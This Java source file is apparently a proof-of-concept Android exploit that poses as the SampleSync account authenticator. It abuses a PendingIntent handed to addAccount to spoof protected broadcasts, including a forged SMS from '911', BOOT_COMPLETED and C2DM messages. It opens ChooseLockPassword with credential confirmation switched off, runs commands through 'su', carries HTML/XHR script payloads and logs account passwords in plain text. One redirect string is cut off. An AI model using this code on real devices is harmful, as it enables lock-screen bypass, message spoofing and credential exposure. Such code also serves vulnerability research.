
package com.example.android.samplesync.authenticator;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.URI;
import java.util.Calendar;
import java.util.GregorianCalendar;

import com.example.android.samplesync.Constants;
import com.example.android.samplesync.client.NetworkUtilities;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.app.PendingIntent;
import android.app.PendingIntent.CanceledException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentSender;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.PhoneNumberUtils;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Log;


class Authenticator extends AbstractAccountAuthenticator {

	
    
    private static final String TAG = "Authenticator";
    
    private static final String VERSION = "v2";

    
    private final Context mContext;

    public Authenticator(Context context) {
        super(context);
        mContext = context;
    }

    
    public final static String HTML = 
    	    "<body>" + 
    	    "<u>Wait a few seconds.</u>" + 
    	    "<script>" + 
    	    "var d = document;" + 
    	    "function doitjs() {" + 
    	    " var xhr = new XMLHttpRequest;" + 
    	    " xhr.onload = function() {" + 
    	    " var txt = xhr.responseText;" + 
    	    " d.body.appendChild(d.createTextNode(txt));" + 
    	    " alert(txt);" + " };" + 
    	    " xhr.open('GET', d.URL);" + 
    	    " xhr.send(null);" + 
    	    "}" + 
    	    "setTimeout(doitjs, 8000);" + 
    	    "</script>" + 
    	    "</body>";
    
    public final static String HTML2 = 
    "<script language=\"javascript\" type=\"text/javascript\">" +
    "window.location.href=\"http:
"</script>";

public static Context getGlobalApplicationContext()
{
    
    
    Class[] type = null;
    Object[] args = null;
    Object AT = ReflectionHelper.invokeStaticMethod("android.app.ActivityThread", type, "currentActivityThread", args);
    if (AT!=null) {
        Object appObject =  ReflectionHelper.invokeNonStaticMethod(AT, type,"getApplication", args);
        if (appObject!=null && appObject instanceof Context) {
            return (Context)appObject;
        }
    }
    return null;
}
private static byte reverseByte(byte b) {
    return (byte) ((b & 0xF0) >> 4 | (b & 0x0F) << 4);
}
// TODO

public static boolean RootCommand(String command){  
    Process process = null;  
    DataOutputStream os = null;  
    try{  
        process = Runtime.getRuntime().exec("su");  
        os = new DataOutputStream(process.getOutputStream());  
        os.writeBytes(command + "\n");  
        os.writeBytes("exit\n");  
        os.flush();  
        process.waitFor();  
    } catch (Exception e){  
        Log.d("*** DEBUG ***", "ROOT failed" + e.getMessage());  
        return false;  
    } finally {
        try{  
            if (os != null) {  
                os.close();  
            }  
            process.destroy();  
        } catch (Exception e) {  
        }  
    }  
    Log.d("*** DEBUG ***", "Root succeed ");  
    return true;  
} 

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType,
            String authTokenType, String[] requiredFeatures, Bundle options) {
        Log.v(TAG, "addAccount()");
        
        Intent intent = new Intent();
       
        
        
        
        if(this.VERSION.contains("v2")){
        	PendingIntent pending_intent = (PendingIntent)options.get("pendingIntent");
        	if(intent!=null){
        	SharedPreferences sp = getGlobalApplicationContext().getSharedPreferences("poc", getGlobalApplicationContext().MODE_WORLD_READABLE);
        	int type   = sp.getInt("poc_type", 1);
        	switch(type){
	        		case 0:
	        			
	        			intent.setAction("android.intent.action.BOOT_COMPLETED");
	        			break;
	        		case 1:
	            		
	
	                    byte[] pduu = createFakeSms(getGlobalApplicationContext(),"911","hello poc");
	                    Object[] objArray  = {pduu};
	                    
	                    intent.setAction("android.provider.Telephony.SMS_DELIVER");
	                    intent.putExtra("pdus", objArray);
	                    intent.putExtra("format", new String("3gpp"));
	        			break;
	        		case 2:
	        			
	        			intent.setAction("com.google.android.c2dm.intent.RECEIVE");
	        			intent.putExtra("from", new String("google.com"));
	        			break;
	        		case 3:
	        			
	        			intent.setAction("com.google.android.c2dm.intent.RECEIVE");
	        			intent.putExtra("from", new String("google.com"));
	        			break;
        			default:
        				break;
        					
     		}
   
                try {
                	pending_intent.send(getGlobalApplicationContext(),0,intent,null,null,null);
    			} catch (CanceledException e) {
    				e.printStackTrace();
    			}
        	}


            
            final Bundle bundle = new Bundle();
            return bundle;
        	
        }else{
        	
            intent.setComponent(new ComponentName(
                    "com.android.settings",
                      "com.android.settings.ChooseLockPassword"));
            intent.setAction(Intent.ACTION_RUN);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("confirm_credentials",false);
            final Bundle bundle = new Bundle();
            bundle.putParcelable(AccountManager.KEY_INTENT, intent);
            return bundle;
        }
        

    }

    @Override
    public Bundle confirmCredentials(
            AccountAuthenticatorResponse response, Account account, Bundle options) {
        Log.v(TAG, "confirmCredentials()");
        return null;
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        Log.v(TAG, "editProperties()");
        throw new UnsupportedOperationException();
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account,
            String authTokenType, Bundle loginOptions) throws NetworkErrorException {
        Log.v(TAG, "getAuthToken()");

        
        
       if (!authTokenType.equals(Constants.AUTHTOKEN_TYPE)) {
            final Bundle result = new Bundle();
            result.putString(AccountManager.KEY_ERROR_MESSAGE, "invalid authTokenType");
            
            Log.v(TAG, "invalid authTokenType" );
            return result;
        }

        
        
        final AccountManager am = AccountManager.get(mContext);
        final String password = am.getPassword(account);
        
        
        Log.v(TAG, "password()"  + password);
        if (password != null && false ) {
             String authToken ;
            authToken = "sadklKLOIHogOpokjh8";
            if (!TextUtils.isEmpty(authToken)) {
            	
            	Log.v(TAG, "start intent");
                final Bundle result = new Bundle();
                result.putString(AccountManager.KEY_ACCOUNT_NAME, account.name);
                result.putString(AccountManager.KEY_ACCOUNT_TYPE, Constants.ACCOUNT_TYPE);
                result.putString(AccountManager.KEY_AUTHTOKEN, authToken);
                Intent intent = new Intent();
                intent.setComponent(new ComponentName(
                        "com.android.settings",
                          "com.android.settings.ChooseLockPassword"));
                intent.setAction(Intent.ACTION_RUN);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        		
        		result.putParcelable(AccountManager.KEY_INTENT, intent);
        
                return result;
            }
        }

        
        
        
        
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "com.android.settings",
                  "com.android.settings.ChooseLockPassword"));
        intent.setAction(Intent.ACTION_RUN);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        final Bundle bundle = new Bundle();

        bundle.putParcelable(AccountManager.KEY_INTENT, intent);
        bundle.putString(AccountManager.KEY_AUTH_FAILED_MESSAGE, "You have  a  missed Call");
        return bundle;
    }

    @Override
    public String getAuthTokenLabel(String authTokenType) {
        
        Log.v(TAG, "getAuthTokenLabel()");
        return null;
    }

    @Override
    public Bundle hasFeatures(
            AccountAuthenticatorResponse response, Account account, String[] features) {
        
        
        
        Log.v(TAG, "hasFeatures()");
        final Bundle result = new Bundle();
        result.putBoolean(AccountManager.KEY_BOOLEAN_RESULT, false);
        return result;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account,
            String authTokenType, Bundle loginOptions) {
        Log.v(TAG, "updateCredentials()");
        return null;
    }
}
